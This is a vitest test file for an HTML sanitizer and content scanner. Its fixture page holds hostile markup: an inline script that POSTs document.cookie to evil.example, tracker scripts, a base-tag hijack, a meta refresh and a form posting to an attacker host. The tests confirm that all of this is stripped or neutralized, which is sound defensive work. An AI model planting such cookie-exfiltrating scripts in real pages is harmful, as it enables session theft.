import { load } from 'cheerio'
import { describe, expect, it } from 'vitest'
import { sanitizeHtml, scanRemovableContent } from './sanitize'

const NASTY = `<!DOCTYPE html>
<html>
<head>
<base href="https://evil.example/">
<meta http-equiv="refresh" content="5;url=https://evil.example/next">
<link rel="stylesheet" href="https://cdn.evil.example/style.css">
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter&display=swap">
<link rel="stylesheet" href="local.css">
<link rel="preconnect" href="https://fonts.gstatic.com">
<style>.hero{color:#fff}</style>
<script src="https://tracker.evil.example/t.js"></script>
<script>fetch('https://evil.example/beacon', { method: 'POST', body: document.cookie })</script>
<script>document.addEventListener('DOMContentLoaded', function () { console.log('ok') })</script>
</head>
<body>
<h1>First heading</h1>
<h1>Second heading</h1>
<img src="https://cdn.evil.example/hero.jpg" srcset="a.jpg 1x, b.jpg 2x" alt="hero">
<img src="data:image/png;base64,iVBORw0KGgo=" alt="inline">
<a href="https://example.test" ping="https://evil.example/ping">a link</a>
<iframe src="https://tracker.evil.example/frame"></iframe>
<iframe src="https://www.google.com/maps?q=Leeds&output=embed"></iframe>
<object data="https://evil.example/o.swf"></object>
<embed src="https://evil.example/e.swf">
<form action="https://evil.example/submit"><input type="text"></form>
</body>
</html>`

describe('sanitizeHtml', () => {
  const { html, report } = sanitizeHtml(NASTY)
  const $ = load(html)

  it('removes every external script and records the src', () => {
    expect($('script[src]')).toHaveLength(0)
    expect(report.removedScripts).toContain('https://tracker.evil.example/t.js')
  })

  it('removes inline scripts that phone home, recording the first 80 chars', () => {
    const snippet = report.removedScripts.find((s) => s.includes('fetch('))
    expect(snippet).toBeDefined()
    expect(snippet!.length).toBeLessThanOrEqual(80)
    expect(html).not.toContain('evil.example/beacon')
  })

  it('keeps benign inline scripts', () => {
    const kept = $('script').filter((_, el) => $(el).text().includes('DOMContentLoaded'))
    expect(kept).toHaveLength(1)
  })

  it('removes external stylesheets but keeps Google Fonts, local links and inline styles', () => {
    expect(report.removedExternalRefs).toContain('https://cdn.evil.example/style.css')
    expect($('link[href^="https://cdn.evil.example"]')).toHaveLength(0)
    expect($('link[href^="https://fonts.googleapis.com"]')).toHaveLength(1)
    expect($('link[href="local.css"]')).toHaveLength(1)
    expect($('link[rel="preconnect"]')).toHaveLength(1)
    expect($('style')).toHaveLength(1)
  })

  it('removes tracking iframes/objects/embeds but keeps the keyless maps embed', () => {
    expect(report.removedExternalRefs).toContain('https://tracker.evil.example/frame')
    expect(report.removedExternalRefs).toContain('https://evil.example/o.swf')
    expect(report.removedExternalRefs).toContain('https://evil.example/e.swf')
    expect($('object, embed')).toHaveLength(0)
    expect($('iframe')).toHaveLength(1)
    expect($('iframe').attr('src')).toContain('google.com/maps')
    expect(report.keptMapsEmbeds).toBe(1)
  })

  it('removes base, meta refresh, ping attributes and srcset', () => {
    expect($('base')).toHaveLength(0)
    expect($('meta[http-equiv]')).toHaveLength(0)
    expect($('a[ping]')).toHaveLength(0)
    expect($('a[href="https://example.test"]')).toHaveLength(1)
    expect($('[srcset]')).toHaveLength(0)
  })

  it('neutralizes form actions to #', () => {
    expect($('form').attr('action')).toBe('#')
    expect(report.neutralizedForms).toBe(1)
  })

  it('replaces external image srcs (http/https/data:) with pending placeholders', () => {
    expect(report.externalImages).toBe(2)
    $('img').each((_, el) => {
      expect($(el).attr('src')).toBe('')
      expect($(el).attr('data-img-pending')).toBeDefined()
    })
  })

  it('demotes 2nd+ h1 to h2', () => {
    expect($('h1')).toHaveLength(1)
    expect($('h1').text()).toBe('First heading')
    expect($('h2').first().text()).toBe('Second heading')
    expect(report.demotedH1s).toBe(1)
  })

  it('produces a report that matches the counts', () => {
    expect(report.removedScripts).toHaveLength(2)
    expect(report.removedExternalRefs).toHaveLength(4)
  })

  it('is idempotent: sanitizing sanitized output reports no removals', () => {
    const second = sanitizeHtml(html)
    expect(second.html).toBe(html)
    expect(second.report).toEqual({
      removedScripts: [],
      removedExternalRefs: [],
      keptMapsEmbeds: 1,
      neutralizedForms: 0,
      externalImages: 0,
      demotedH1s: 0,
    })
  })
})

describe('scanRemovableContent', () => {
  it('flags everything the sanitizer would touch, without mutating', () => {
    const findings = scanRemovableContent(NASTY)
    expect(findings.some((f) => f.startsWith('script-src:'))).toBe(true)
    expect(findings.some((f) => f.startsWith('inline-script:'))).toBe(true)
    expect(findings.some((f) => f.startsWith('external-stylesheet:'))).toBe(true)
    expect(findings.some((f) => f.startsWith('embed:'))).toBe(true)
    expect(findings.some((f) => f.startsWith('base:'))).toBe(true)
    expect(findings.some((f) => f.startsWith('meta-refresh:'))).toBe(true)
    expect(findings.some((f) => f.startsWith('ping-attr:'))).toBe(true)
    expect(findings.some((f) => f.startsWith('srcset-attr:'))).toBe(true)
    expect(findings.some((f) => f.startsWith('form-action:'))).toBe(true)
    expect(findings.some((f) => f.startsWith('external-img:'))).toBe(true)
    expect(findings.some((f) => f.startsWith('extra-h1:'))).toBe(true)
  })

  it('returns no findings for sanitized output', () => {
    const { html } = sanitizeHtml(NASTY)
    expect(scanRemovableContent(html)).toEqual([])
  })
})
